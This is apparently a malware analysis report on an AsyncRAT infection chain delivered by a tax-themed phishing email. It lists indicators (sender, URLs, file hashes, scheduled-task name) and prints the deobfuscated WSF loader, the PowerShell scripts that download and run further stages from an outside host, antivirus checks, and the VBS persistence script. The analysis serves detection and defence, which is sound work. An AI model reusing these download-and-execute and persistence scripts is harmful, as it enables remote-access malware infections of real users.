THREAT IDENTIFICATION:  ASYNCRAT

SUBJECTS OBSERVED
How to File a Tax Return If You've Moved States - September 15, 2023

SENDERS OBSERVED
Tuition Reimbursement Plan Administrators <info@trax.pk>

URL FROM THE EMAIL
https://49dprq8p.r.eu-west-1.awstrack.me/L0/https:%2F%2Ftax-form-docoments.blogspot.com%2F/1/0102018a9a2875c7-acca01a3-afd2-4f19-8abf-197eed444b10-000000/iqRDeej3k8J3bbAnWBTEAFU9WJQ=339

LANDING PAGE URL
https://tax-form-docoments.blogspot.com/

ZIP FILE DOWNLOAD URL
https://labradorinblack.com/.do/wws.php

ZIP FILE HASH
tCMcDXRvNU.zip
18dbaac45b6f02283b50706a49878330

WSF FILE HASH
tCMcDXRvNU.wsf
285d402bdc807e56d1243261d79dec16

The .wsf file was obfuscated with many rows of odd ASCII characters.

DEOBFUSCATED WSF FILE (ODD CHARACTERS REMOVED)
<script language="VBScript" src="https://lambdacientifica.com/.f/.file.txt" />

FIRST POWERSHELL SCRIPT DOWNLOAD URL
https://lambdacientifica.com/.f/.file.txt

FIRST POWERSHELL SCRIPT FILE HASH
file.txt
0be78e194e0d830183a084596c2cad51

FIRST POWERSHELL SCRIPT CONTENTS
on error resume next
Set objShell = CreateObject ("WScript.shell")
objShell.Run "powershell  $KXE='iex(NeW-OBJeCT NeT.W';$kds='eBCLIeNT).DOWNLO';Sleep 2;[BYTe[]];Sleep 3;$RHS='#$&@(''https://lambdacientifica.com/.f/.ACTIVATED.txt'')'.RePLACe('#$&@','ADSTRING');Sleep 1;($KXE+$kds+$RHS) | iex" , 0, True

SECOND POWERSHELL SCRIPT DOWNLOAD URL
https://lambdacientifica.com/.f/.ACTIVATED.txt

SECOND POWERSHELL SCRIPT FILE HASH
ACTIVATED.txt
08e3bb39e611dcc070f9106c65332ef3

SECOND POWERSHELL SCRIPT CONTENTS
Function Visualizations
{

start-sleep -s 2
[system.io.directory]::CreateDirectory("C:\ProgramData\Document\")
#-----------------------------------------------------------------------------
$Content = @'
set T1 = CreateObject("WScript.Shell")
T1.run "powershell -ExecutionPolicy Bypass & C"+":"+"\"+"P"+"r"+"o"+"g"+"r"+"a"+"m"+"D"+"a"+"t"+"a"+"\"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t"+"\"+"S"+"T"+"O"+"P"+"S"+"E"+"R"+"V"+"."+"p"+"s"+"1",0

'@
[IO.File]::WriteAllText("C:\ProgramData\Document\Reload.vbs", $Content)
#-----------------------------------------------------------------------------

start-sleep -s 3

$action = New-ScheduledTaskAction -Execute 'C:\ProgramData\Document\Reload.vbs'
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 2)
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ISymWrapper"

start-sleep -s 6

$NEWS = 'C/:/\P/r/o/g/ra/m/D/at/a\D/oc/um/ent\'.Replace("/","")
$mcAfee = 'C:/\Pro/gram Fil/es\Common /Files\McAfee\/Platf/orm\McUIC/nt.e/xe'.Replace("/","")
$nort = 'C:/\Pr/og/ra/m Fil/es\No/r/to/n S/ecu/rit/y\i/so/l/at/e./i/n/i'.Replace("/","")

if([System.IO.File]::Exists($mcAfee)){

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://lambdacientifica.com/.f/M1.jpg', $NEWS + 'STOPSERV.ps1')){
}
start-sleep -s 7
Start "C:\ProgramData\Document\Reload.vbs"
}
elseif([System.IO.File]::Exists($nort)){

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://lambdacientifica.com/.f/N1.jpg', $NEWS + 'STOPSERV.ps1')){
}
start-sleep -s 7
Start "C:\ProgramData\Document\Reload.vbs"
}
else{

if((New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`F`i`l`e"('https://lambdacientifica.com/.f/D1.jpg', $NEWS + 'STOPSERV.ps1')){
}

start-sleep -s 7
Start "C:\ProgramData\Document\Reload.vbs"
}

}
IEX Visualizations

THIRD POWERSHELL SCRIPT DOWNLOAD URL
https://lambdacientifica.com/.f/D1.jpg
(The .exe is embedded within this file)

THIRD POWERSHELL SCRIPT FILE HASH
D1.jpg
c86e2e1aa3eff70209c9cd9ccef753ad

PAYLOAD FILE HASH
download.exe
868650384b914fe3c23718e8af5a5242
(This is the file hash of the extracted .exe)

DROPPED VBS SCRIPT FILE HASH
Reload.vbs
2f324f424f269bc3fb030d6615b3657e

DROPPED VBS SCRIPT FILE CONTENTS
set T1 = CreateObject("WScript.Shell")
T1.run "powershell -ExecutionPolicy Bypass & C"+":"+"\"+"P"+"r"+"o"+"g"+"r"+"a"+"m"+"D"+"a"+"t"+"a"+"\"+"D"+"o"+"c"+"u"+"m"+"e"+"n"+"t"+"\"+"S"+"T"+"O"+"P"+"S"+"E"+"R"+"V"+"."+"p"+"s"+"1",0

COPIED POWERSHELL SCRIPT FILE HASH
STOPSERV.ps1
c86e2e1aa3eff70209c9cd9ccef753ad
(This is the same file that was downloaded as D1.jpg)
(It contains the embedded .exe and commands to decode and (re)launch it)

ASYNCRAT C2
I saw no C2 traffic.

STRINGS FROM MEMORY
AsyncCallback
IAsyncResult
AsyncMutex_6LDMFdse8
AsyncRAT Server0
CN=AsyncRAT Server

SCHEDULED TASK FOR PERSISTENCE
Task Name: ISymWrapper

It runs every 2 minutes and calls:
C:\ProgramData\Document\Reload.vbs


